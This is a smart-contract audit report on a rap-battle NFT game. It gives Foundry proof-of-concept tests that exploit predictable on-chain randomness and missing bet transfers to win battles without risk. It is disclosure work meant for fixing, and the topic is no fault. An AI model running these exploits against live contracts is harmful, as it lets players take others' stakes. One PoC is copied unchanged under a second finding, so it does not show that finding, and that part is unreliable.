#FINAL REPORT

[L1]: The function `OneShot.getRapperStats(_tokenId)` returns inconsistent information.

## Summary
The function `OneShot.getRapperStats(_tokenId)` does not check if the `tokenId` exists.

## Vulnerability Details
When we call the function `OneShot.getRapperStats(_tokenId)` with an NFT `tokenId`, it doesn't verify whether the `tokenId` has been minted. Therefore, it returns inconsistent information if the `tokenId` does not exist. If a user burns their token, they could potentially use the stats of the burned token to engage in battles.

## Impact
The statistical information returned is incorrect if the `tokenId` doesn't exist.

## Tools Used
Manual review.

## Recommendations
Check if the token exists before returning the statistics.

```diff
function getRapperStats(uint256 tokenId) public view returns (RapperStats memory) {
+    require(_ownerOf(tokenId) != address(0), "Token does not exist."); // Ensure the token exists
    return rapperStats[tokenId];
}
```



[H1] Weak Pseudo-Random Number Generators

## Summary
Bad randomness vulnerability occurs when a smart contract relies on a source of randomness that is not truly random or that can be predicted by an attacker. This can allow an attacker to manipulate the outcome of a transaction or gain an unfair advantage over other users.

## Vulnerability Details
A challenger can create a smart contract that checks if they win before going on battle. If the result is successful, the goOnBattle is executed; if the result is not favorable, the user can choose not to go to battle and wait to attempt another time.

## Impact
A challenger can always win the bet and never lose, which is unfair for the defender that goes to battle.

## Code Example
This code is to be added into the smart contract `RapBattleTest.sol#RapBattleTest`:

```javascript
function testGoOnBattleOnlyUserWin() public mintRapper {

    /********* Have 2 users that have NFT and 4 cred Tokens **********************************/
    address user2 = makeAddr("User2");
    vm.prank(user2);
    oneShot.mintRapper();

    vm.startPrank(user);
    oneShot.approve(address(streets), 0);
    streets.stake(0);
    vm.stopPrank();

    vm.startPrank(user2);
    oneShot.approve(address(streets), 1);
    streets.stake(1);
    vm.stopPrank();

    vm.warp(4 days + 1);

    vm.startPrank(user);
    streets.unstake(0);
    vm.stopPrank();

    vm.startPrank(user2);
    streets.unstake(1);
    vm.stopPrank();

    // Check the balance of both users after 4 days stake
    assert(cred.balanceOf(address(user)) == 4);
    assert(cred.balanceOf(address(user2)) == 4);

    // User goes on battle as defender
    vm.startPrank(user);
    oneShot.approve(address(rapBattle), 0);
    cred.approve(address(rapBattle), 3);
    rapBattle.goOnStageOrBattle(0, 3);
    vm.stopPrank();

    // User2 manipulates RNG to only go on battle if he wins

    bool win = false;
    // He could calculate the number and check if he wins before deciding to approve the NFT and credToken 
    while (!win) {
        uint256 defenderRapperSkill = rapBattle.getRapperSkill(0);
        uint256 challengerRapperSkill = rapBattle.getRapperSkill(1);
        uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;

        uint256 random =
            uint256(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1), user2))) % totalBattleSkill;

        win = random > defenderRapperSkill ? true : false;

        vm.warp(111 seconds);
        vm.roll(block.number + 1);

        if (win) {
            vm.startPrank(user2);
            oneShot.approve(address(rapBattle), 1);
            cred.approve(address(rapBattle), 3);
            rapBattle.goOnStageOrBattle(1, 3);
            vm.stopPrank();
        } else {
            console.log("##### User2 loses and decides not to go on battle");
        }
    }

    // Check the owner of NFT 0
    assertEq(oneShot.ownerOf(0), address(user), "Owner of NFT 0 is not user");
    assertEq(oneShot.ownerOf(1), address(user2), "Owner of NFT 1 is not user2");

    // Check the balance
    assertEq(cred.balanceOf(address(user2)), 7, "User2 balance is not 7");
}
```

## Tools Used
Foundry

## Recommendations
Use Chainlink or an Oracle. Chainlink VRF (Verifiable Random Function) is a provably fair and verifiable random number generator (RNG) that enables smart contracts to access random values without compromising security or usability.



## Anyone with 0 CredToken can go on Battle and potentially win rewards

### Summary
A challenger can go to battle without betting any CredToken. Even if they don't have any CredToken, they can still win the reward if they win the battle. If they lose, nothing happens, and the transaction is reverted.

### Vulnerability Details

### Impact
It is unfair for the defender who needs to bet their CredToken, as the challenger can go on Battle without risking any CredToken.

### Tools Used
Foundry

### Proof of Concept (POC)

Add this code in the Smart contract:

1. We have 2 users, `user` and `user2`.
   - `user` manages to mint OneShot NFT and gets 4 CredToken.
   - `user2` does not have any CredToken.

2. `user` goes on battle as defender.
   - `user2` can also go on battle without having any CredToken.

If `user2` wins, they can get the reward; if they lose, the transaction is reverted.

```javascript
function testGoOnBattleWithZeroCredToken() public mintRapper {
    address user2 = makeAddr("User2");

    vm.startPrank(user);
    oneShot.approve(address(streets), 0);
    streets.stake(0);
    vm.stopPrank();

    vm.warp(4 days + 1);

    vm.startPrank(user);
    streets.unstake(0);
    vm.stopPrank();

    // user has 4 CredToken and user2 has none
    assert(cred.balanceOf(address(user)) == 4);
    assert(cred.balanceOf(address(user2)) == 0);

    // user goes on battle as defender
    vm.startPrank(user);
    oneShot.approve(address(rapBattle), 0);
    cred.approve(address(rapBattle), 3);
    rapBattle.goOnStageOrBattle(0, 3);
    vm.stopPrank();

    // user2 manipulates RNG to only go on battle if they win

    bool win = false;

    while (!win) {
        uint256 defenderRapperSkill = rapBattle.getRapperSkill(0);
        uint256 challengerRapperSkill = rapBattle.getRapperSkill(1);
        uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;

        uint256 random =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, user2))) % totalBattleSkill;

        win = random > defenderRapperSkill ? true : false;

        vm.warp(111 seconds);
        vm.roll(block.number + 1);

        if (win) {
            vm.startPrank(user2);
            rapBattle.goOnStageOrBattle(0, 3);
            vm.stopPrank();
        } else {
            console.log("##### user loses and decides not to go on battle");
        }
    }

    // check the owner of NFT 0
    assertEq(oneShot.ownerOf(0), address(user), "Owner of NFT 0 is not user");

    // check the balance; the user should not get a reward but they get 3 tokens as a reward
    assertEq(cred.balanceOf(address(user2)), 3, "User2 balance is not 3");
}
```

## Recommendations
The function goOnStageOrBattle should also transfer the cred token to the rapBattle contract. Please uncomment line 49 in the smart contract RapBattle.sol.

```diff
    function goOnStageOrBattle(uint256 _tokenId, uint256 _credBet) external {
        if (defender == address(0)) {
            defender = msg.sender;
            defenderBet = _credBet;
            defenderTokenId = _tokenId;

            emit OnStage(msg.sender, _tokenId, _credBet);

            oneShotNft.transferFrom(msg.sender, address(this), _tokenId);
            credToken.transferFrom(msg.sender, address(this), _credBet);
        } else {
+            credToken.transferFrom(msg.sender, address(this), _credBet);
-			//credToken.transferFrom(msg.sender, address(this), _credBet);
            _battle(_tokenId, _credBet);
        }
    }
 ```

## Challenger can use any OneShot NFT to go to battle (even the defender one)

### Summary
A challenger can go to battle without betting or having OneShot NFT.
 Even if they don't have his own NFT, they can still win the reward if they win the battle. If they lose, nothing happens, and the transaction is reverted.

### Vulnerability Details

### Impact
It is unfair for the defender who needs to bet their NFT, as the challenger can go on Battle using othe ruser NFT 

### Tools Used
Foundry

### Proof of Concept (POC)

Add this code in the Smart contract:

1. We have 2 users, `user` and `user2`.
   - `user` manages to mint OneShot NFT and gets 4 CredToken.
   - `user2` does not have any NFT, he go onBlattle with the tokenId of the defender

2. `user` goes on battle as defender.
   - `user2` can also go on battle without having any NFT.

If `user2` wins, they can get the reward; if they lose it's depends if he approve or not credToken.

```javascript
function testGoOnBattleWithZeroCredToken() public mintRapper {
    address user2 = makeAddr("User2");

    vm.startPrank(user);
    oneShot.approve(address(streets), 0);
    streets.stake(0);
    vm.stopPrank();

    vm.warp(4 days + 1);

    vm.startPrank(user);
    streets.unstake(0);
    vm.stopPrank();

    // user has 4 CredToken and user2 has none
    assert(cred.balanceOf(address(user)) == 4);
    assert(cred.balanceOf(address(user2)) == 0);

    // user goes on battle as defender
    vm.startPrank(user);
    oneShot.approve(address(rapBattle), 0);
    cred.approve(address(rapBattle), 3);
    rapBattle.goOnStageOrBattle(0, 3);
    vm.stopPrank();

    // user2 manipulates RNG to only go on battle if they win

    bool win = false;

    while (!win) {
        uint256 defenderRapperSkill = rapBattle.getRapperSkill(0);
        uint256 challengerRapperSkill = rapBattle.getRapperSkill(1);
        uint256 totalBattleSkill = defenderRapperSkill + challengerRapperSkill;

        uint256 random =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, user2))) % totalBattleSkill;

        win = random > defenderRapperSkill ? true : false;

        vm.warp(111 seconds);
        vm.roll(block.number + 1);

        if (win) {
            vm.startPrank(user2);
            rapBattle.goOnStageOrBattle(0, 3);
            vm.stopPrank();
        } else {
            console.log("##### user loses and decides not to go on battle");
        }
    }

    // check the owner of NFT 0
    assertEq(oneShot.ownerOf(0), address(user), "Owner of NFT 0 is not user");

    // check the balance; the user should not get a reward but they get 3 tokens as a reward
    assertEq(cred.balanceOf(address(user2)), 3, "User2 balance is not 3");
}
```

## Recommendations

the function goOnStageOrBattle , should also transfer the NFT token to the rapBattle contract

```javascript
    function goOnStageOrBattle(uint256 _tokenId, uint256 _credBet) external {
        if (defender == address(0)) {
            defender = msg.sender;
            defenderBet = _credBet;
            defenderTokenId = _tokenId;

            emit OnStage(msg.sender, _tokenId, _credBet);

            oneShotNft.transferFrom(msg.sender, address(this), _tokenId);
            credToken.transferFrom(msg.sender, address(this), _credBet);
        } else {
+           oneShotNft.transferFrom(msg.sender, address(this), _tokenId);
-			//credToken.transferFrom(msg.sender, address(this), _credBet);
            _battle(_tokenId, _credBet);
        }
    }
  ```


**[L1] User's Battle Won Statistics Are Not Updated Upon Victory**

## Summary
The battle won statistics are not updated when the user wins a battle.

## Vulnerability Details
When the user wins a battle, their statistics do not reflect this victory; the "battle won" statistic remains at zero.

## Impact
This results in inaccurate information regarding user statistics.

## Tools Used
Manual review

## Recommendations
Update the statistics when the user wins a battle.
